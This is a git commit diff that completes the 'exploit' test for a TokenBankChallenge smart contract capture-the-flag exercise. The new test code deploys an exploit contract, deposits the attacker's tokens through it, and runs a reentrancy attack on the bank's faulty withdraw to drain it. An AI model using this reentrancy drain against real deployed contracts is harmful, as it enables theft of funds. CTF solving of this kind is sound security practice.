bbc424057521f5e86e2ff5a1ff7b4ffe1a8e97e1
ffmcgee <jc.992@hotmail.com>
2024-09-13 14:26:16 +0200

    test: add exploit for TokenBankChallenge

--- test/20-TokenBank.test.ts
+++ test/20-TokenBank.test.ts
@@ -35,9 +35,25 @@ describe('TokenBankChallenge', () => {
   });
 
   it('exploit', async () => {
+    const exploitFactory = await ethers.getContractFactory('TokenBankExploit');
+    const exploitContract = await exploitFactory.deploy(target.address, token.address);
+    await exploitContract.deployed();
+
+    const tokenAmount = ethers.BigNumber.from(10).pow(18).mul(500_000);
+
     /**
-     * YOUR CODE HERE
-     * */
+     * We first need to get the attacker supply over to the exploit contract
+     */
+    await target.withdraw(tokenAmount);
+    await token['transfer(address,uint256)'](exploitContract.address, tokenAmount);
+    await exploitContract.deposit(tokenAmount);
+
+    /**
+     * We then run the reentrancy exploit due to faulty `withdraw` implementation on bank contract
+     * We then transfer all the funds to attacker address to pass the test
+     */
+    await exploitContract.exploit();
+    await exploitContract.transferFundsTo(attacker.address);
 
     expect(await token.balanceOf(target.address)).to.equal(0);
     expect(await token.balanceOf(attacker.address)).to.equal(
